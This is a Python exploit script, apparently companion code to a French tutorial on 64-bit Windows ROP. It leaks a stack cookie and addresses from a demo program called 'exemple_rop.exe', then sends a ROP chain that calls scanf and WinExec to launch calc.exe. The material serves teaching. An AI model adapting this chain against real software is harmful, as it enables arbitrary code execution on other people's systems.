# https://www.dailysecurity.fr/windows_exploit_64_bits_rop/

from pwintools import *

p = Process(b"exemple_rop.exe")
# p.spawn_debugger(breakin=False)

p.recvuntil(b":")
p.sendline(bytes(str(500).encode()))
p.recvuntil(b":")
p.sendline(b"a"*60)

leak = p.recvuntil(b":")[65:]

ntdll_base = p.libs['ntdll.dll']
kernel32_base = p.libs['kernel32.dll']
ret_addr = u64(leak[0x18:0x20])
base_addr = ret_addr - 0x36c # offset address after call main
cookie = u64(leak[:8])

poprcx = ntdll_base + 0x11fe9
poprdx = ntdll_base + 0x12991
retgadget = ntdll_base + 0x7cbe2
pop4ret = ntdll_base + 0x14caf
s_addr = base_addr + 0x126c
winexec_addr = kernel32_base + 0xdf840
winexec_addr = kernel32_base + 0xdf840
data_addr = base_addr + 0x2600
scanf_addr = base_addr + 0x10


log.info("chall.exe base address : 0x%x"     % base_addr)
log.info("ntdll.dll base address : 0x%x"     % ntdll_base)
log.info("kernel32.dll base address : 0x%x"  % kernel32_base)
log.info("cookie value : 0x%x"               % cookie)
log.info("Winexec address : 0x%x"            % winexec_addr)
log.info("scanf address : 0x%x"              % scanf_addr)
log.info("ret address : 0x%x"                % ret_addr)

log.info("Build ropchain")

ropchain=b"a"*64 + p64(cookie) + b"b"*16

#scanf("%s",data_addr);
ropchain+=p64(poprcx) + p64(s_addr) # Pop 1st arg
ropchain+=p64(poprdx) + p64(data_addr) # Pop 2nd arg 
ropchain+=p64(retgadget)+p64(scanf_addr) + p64(pop4ret) # Align rsp using ret + call scanf + set return addr to pop4ret to jump over the shadow space
ropchain+=b"b"*0x20 # Padding to return address (shadow space size)

#WinExec(data_addr,1);
ropchain+=p64(poprcx) + p64(data_addr) # Pop 1st arg
ropchain+=p64(poprdx) + p64(1) # Pop 2nd arg
ropchain+=p64(winexec_addr) #  call WinExec
ropchain+=p64(ret_addr) # Set return address to the real main return value
log.info("Trigger overflow...")
p.sendline(bytes(str(600).encode()))
p.sendline(ropchain)
p.sendline(b'calc.exe\x00') # for the scanf inside the ropchain
log.info("Gimme that calc")